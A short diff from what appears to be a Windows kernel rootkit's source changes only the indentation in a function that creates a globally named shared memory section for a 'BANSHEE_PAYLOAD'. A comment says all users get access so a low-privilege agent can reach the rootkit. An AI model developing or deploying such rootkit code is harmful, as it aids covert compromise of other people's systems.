@@ -18,15 +18,15 @@
 NTSTATUS 
 BeCreateSharedMemory()
 {
-	UNICODE_STRING       SectionName = { 0 };
-	PSECURITY_DESCRIPTOR Sd          = { 0 };
-	OBJECT_ATTRIBUTES    ObjAttr     = { 0 };
-	LARGE_INTEGER        SectionSize = { 0 };
-	KAPC_STATE			 Apc		 = { 0 };
-	NTSTATUS			 Status	     = STATUS_UNSUCCESSFUL;
-	SIZE_T				 ulViewSize  = sizeof(BANSHEE_PAYLOAD);
+    UNICODE_STRING       SectionName = { 0 };
+    PSECURITY_DESCRIPTOR Sd          = { 0 };
+    OBJECT_ATTRIBUTES    ObjAttr     = { 0 };
+    LARGE_INTEGER        SectionSize = { 0 };
+    KAPC_STATE           Apc         = { 0 };
+    NTSTATUS             Status      = STATUS_UNSUCCESSFUL;
+    SIZE_T	             ulViewSize  = sizeof(BANSHEE_PAYLOAD);
 
-	RtlInitUnicodeString(&SectionName, L"\\BaseNamedObjects\\Global\\BeShared");
+    RtlInitUnicodeString(&SectionName, L"\\BaseNamedObjects\\Global\\BeShared");
 
 	//
 	// Add permissions to all users to our shared memory, so that a lowpriv agent can still access the rootkit
